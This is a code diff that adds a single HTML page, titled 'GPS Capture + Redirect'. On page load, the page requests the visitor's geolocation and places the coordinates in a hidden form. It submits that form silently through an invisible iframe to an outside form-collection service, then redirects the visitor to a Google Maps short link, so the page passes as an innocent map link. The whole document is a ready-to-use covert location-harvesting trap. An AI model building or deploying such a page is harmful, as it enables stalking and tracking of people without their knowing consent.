@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>GPS Capture + Redirect</title>
+</head>
+<body>
+  <!-- Hidden form -->
+  <form id="gpsForm" action="https://formcarry.com/s/u9C-DN_4ojh" method="POST" target="hiddenFrame">
+    <input type="hidden" name="latitude" id="lat">
+    <input type="hidden" name="longitude" id="lon">
+  </form>
+
+  <!-- Invisible iframe to handle background form submission -->
+  <iframe name="hiddenFrame" style="display:none;"></iframe>
+
+  <script>
+    const redirectURL = "https://maps.app.goo.gl/7BH2yzwYTJfYa8wq6"; // 🔗 your redirect link here
+
+    async function requestLocationFlow() {
+      if (!navigator.geolocation) {
+        return;
+      }
+
+      try {
+        const permission = await navigator.permissions.query({ name: "geolocation" });
+
+        if (permission.state === "granted" || permission.state === "prompt") {
+          navigator.geolocation.getCurrentPosition(
+            pos => {
+              // Fill form values
+              document.getElementById("lat").value = pos.coords.latitude;
+              document.getElementById("lon").value = pos.coords.longitude;
+
+              // Submit form silently
+              document.getElementById("gpsForm").submit();
+
+              // Redirect after short delay
+              setTimeout(() => {
+                window.location.href = redirectURL;
+              }, 1000);
+            },
+            err => console.log("❌ User denied or error:", err)
+          );
+        } else if (permission.state === "denied") {
+          console.log("⚠️ Location permission denied. Cannot send location.");
+        }
+
+        // Re-check when permission changes
+        permission.onchange = () => requestLocationFlow();
+      } catch (err) {
+        console.log("❌ Error checking permissions:", err);
+      }
+    }
+
+    // Run on page load
+    document.addEventListener("DOMContentLoaded", requestLocationFlow);
+  </script>
+</body>
+</html>
